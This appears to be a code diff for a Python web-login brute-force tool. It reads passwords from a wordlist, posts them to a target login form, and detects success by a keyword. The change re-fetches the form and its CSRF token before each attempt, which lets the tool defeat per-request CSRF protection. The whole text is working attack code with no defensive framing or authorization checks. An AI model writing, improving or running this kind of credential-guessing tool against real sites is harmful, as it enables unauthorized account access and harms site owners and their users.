@@ -4,21 +4,22 @@ from urllib.parse import urljoin
 import time
 
 
-def get_login_form(login_url):
+def get_login_form(session, login_url):
     """
-    Fetch and parse the login form from a webpage.
+    Fetch and parse the login form from a webpage using an existing session.
+    Returns the form action, method, and input fields (including CSRF tokens).
     """
-    session = requests.Session()
-
     try:
         response = session.get(login_url, timeout=10)
     except requests.RequestException as e:
-        return None, None, None, None  # Handle in calling function
+        print(f"[!] Failed to connect to login page: {e}")
+        return None, None, None
 
     soup = BeautifulSoup(response.text, "html.parser")
     form = soup.find("form")
     if not form:
-        return None, None, None, None
+        print("[!] No form found on page.")
+        return None, None, None
 
     action = form.get("action", "")
     method = form.get("method", "post").lower()
@@ -30,7 +31,7 @@ def get_login_form(login_url):
         if name:
             fields[name] = value
 
-    return session, action, method, fields
+    return action, method, fields
 
 
 def run_bruteforce(
@@ -40,23 +41,13 @@ def run_bruteforce(
     update_progress,
     user_field_override=None,
     pass_field_override=None,
-    success_keyword="dashboard",
+    success_keyword="welcome",
     delay=0,
 ):
-
-    session, action, method, form_data = get_login_form(login_url)
-    if None in (session, action, method, form_data):
-        return "[!] Error loading or parsing the login form."
-
-    username_field = user_field_override or next(
-        (k for k in form_data if "user" in k.lower()), None
-    )
-    password_field = pass_field_override or next(
-        (k for k in form_data if "pass" in k.lower()), None
-    )
-
-    if not username_field or not password_field:
-        return "[!] Could not identify login fields. Please provide field names."
+    """
+    Brute-force login form that handles CSRF tokens per attempt.
+    """
+    session = requests.Session()  # session is kept across attempts
 
     try:
         with open(wordlist_path, "r", encoding="latin-1") as f:
@@ -68,6 +59,24 @@ def run_bruteforce(
 
     for i, password in enumerate(passwords):
         password = password.strip()
+
+        # Fetch fresh form and CSRF token before each login attempt
+        action, method, form_data = get_login_form(session, login_url)
+        if None in (action, method, form_data):
+            return "[!] Failed to reload login form."
+
+        # Use overrides or try to auto-detect input fields
+        username_field = user_field_override or next(
+            (k for k in form_data if "user" in k.lower()), None
+        )
+        password_field = pass_field_override or next(
+            (k for k in form_data if "pass" in k.lower()), None
+        )
+
+        if not username_field or not password_field:
+            return "[!] Could not detect or override login field names."
+
+        # Update login fields
         form_data[username_field] = username
         form_data[password_field] = password
 
@@ -76,7 +85,7 @@ def run_bruteforce(
         try:
             response = session.post(full_action_url, data=form_data, timeout=10)
         except requests.RequestException:
-            continue  # Skip failed attempt
+            continue  # skip failed attempt
 
         if success_keyword.lower() in response.text.lower():
             update_progress(100)
